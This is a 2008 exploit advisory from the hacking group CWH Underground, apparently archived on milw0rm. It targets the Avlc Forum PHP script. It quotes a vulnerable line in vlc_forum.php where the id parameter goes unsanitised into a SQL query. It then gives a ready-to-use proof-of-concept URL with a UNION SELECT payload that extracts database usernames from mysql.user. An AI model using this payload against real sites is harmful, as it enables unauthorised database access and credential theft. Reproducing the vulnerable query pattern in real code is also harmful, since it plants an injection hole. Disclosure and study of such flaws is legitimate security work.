@@ -1,0 +1,54 @@
+====================================================================
+  Avlc Forum (vlc_forum.php id) Remote SQL Injection Vulnerability
+====================================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 12 July 2008
+SITE   : cwh.citec.us
+
+
+#####################################################
+ APPLICATION : Avlc Forum
+ VERSION     : N/A
+ VENDOR	     : N/A
+ DOWNLOAD    : http://www.easy-script.com/compt.php?id=2147
+#####################################################
+
+-- Remote SQL Injection ---
+
+---------------------------------
+ Vulnerable File [vlc_forum.php]
+---------------------------------
+
+@Line
+
+   141:  $sql = "SELECT * FROM vlc_forum WHERE id=$id OR re=$id";
+   142:  $req = mysql_query($sql) or die('Erreur SQL !'.$sql.'<br>' . mysql_error());
+
+
+-------------
+ POC Exploit
+-------------
+
+[+] http://[Target]/[avlc_path]/vlc_forum.php?action=affich_message&id=-999999/**/UNION/**/SELECT/**/1,user,3,4,5,6,7,8,9/**/FROM/**/mysql.user--
+
+
+#####################################################################
+ Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos   
+ Special Thx : asylu3, str0ke, citec.us, milw0rm.com
+#####################################################################
+
+# milw0rm.com [2008-07-12]
